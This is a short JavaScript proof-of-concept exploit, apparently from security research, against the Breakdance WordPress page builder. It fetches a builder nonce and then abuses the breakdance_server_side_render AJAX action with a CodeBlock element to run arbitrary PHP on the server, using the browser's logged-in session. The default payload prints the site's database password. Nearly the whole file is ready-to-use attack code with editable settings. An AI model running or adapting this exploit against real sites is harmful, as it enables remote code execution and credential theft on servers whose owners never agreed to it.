<script>
/*****************************************
*  You can edit this */

// Page id of an existing page, ANY will do
const page_id = 13;

// The PHP payload to execute
var php_code = '<?php echo DB_PASSWORD; ?>';

/*****************************************
*  Don't edit below */

// Get builder nonce
const xhttp = new XMLHttpRequest();
xhttp.open("GET", "/?breakdance=builder&id=" + page_id, false);
xhttp.send();
var nonce = getStringBetween(xhttp.responseText, 'ajaxnonce":"', '",')
console.log("nonce: ", nonce)

// Execute PHP payload
const form = new FormData();
form.append('action', 'breakdance_server_side_render');
form.append('properties', '{"content":{"content":{"php_code":"'+php_code+'"}}}');
form.append('parentProperties', '{}');
form.append('elementSlug', 'EssentialElements\\CodeBlock');
form.append('triggeringDocument', '13');
form.append('breakdance_ajax_at_any_url', 'true');

let xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open('POST', 'https://bd.blueteamer.io/testpage/?_breakdance_doing_ajax=yes&_ajax_nonce='+nonce);
xhr.setRequestHeader('x-requested-with', 'BreakdanceXMLHttpRequest');

xhr.onload = function() {
  resp_data = JSON.parse(xhr.response);
  console.log("RESPONSE: ", resp_data['html']);
  //console.log(xhr.response);
};

xhr.send(form);

// Helper
function getStringBetween(str, start, end) {
    const result = str.match(new RegExp(start + "(.*?)" + end));

    return result[1];
}
</script>
